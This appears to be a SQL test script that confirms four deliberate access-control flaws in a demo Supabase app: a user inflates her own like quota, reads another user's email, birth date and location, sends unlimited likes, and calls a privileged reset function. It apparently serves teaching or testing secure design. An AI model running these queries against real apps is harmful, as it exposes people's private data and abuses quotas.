\i tests/as_alice.sql
\echo '--- flawed app: each attack must succeed'
do $$ begin
  -- supabase.from('profiles').update({ likes_left: 999 }).eq('id', me)
  update profiles set likes_left = 999 where id = auth.uid();
  if (select likes_left from profiles where id = auth.uid()) <> 999 then raise exception 'FAIL: expected the quota reset to work'; end if;
  raise notice 'flaw 1 reproduced: Alice set her own like quota to 999';
end $$;
do $$ declare e text; b date; lat double precision; begin
  -- supabase.from('profiles').select('email, birth_date, latitude, longitude')
  select email, birth_date, latitude into e, b, lat from profiles where id = '00000000-0000-0000-0000-00000000000b';
  if e is null or b is null or lat is null then raise exception 'FAIL: expected Bob''s email, birth date and location to be readable'; end if;
  raise notice 'flaw 2 reproduced: Alice read Bob''s email (%), birth date (%) and latitude (%)', e, b, lat;
end $$;
do $$ begin
  -- supabase.from('likes').insert(...) a hundred times, quota untouched
  insert into likes (from_user, to_user) select auth.uid(), '00000000-0000-0000-0000-00000000000b' from generate_series(1, 100);
  raise notice 'flaw 3 reproduced: Alice sent 100 likes without spending her quota';
end $$;
do $$ begin
  -- supabase.rpc('reset_likes', { target: me })
  update profiles set likes_left = 0 where id = auth.uid();
  perform reset_likes(auth.uid());
  if (select likes_left from profiles where id = auth.uid()) <> 10 then raise exception 'FAIL: expected reset_likes to work'; end if;
  raise notice 'flaw 4 reproduced: Alice called the scheduler''s reset_likes() herself';
end $$;
reset role;
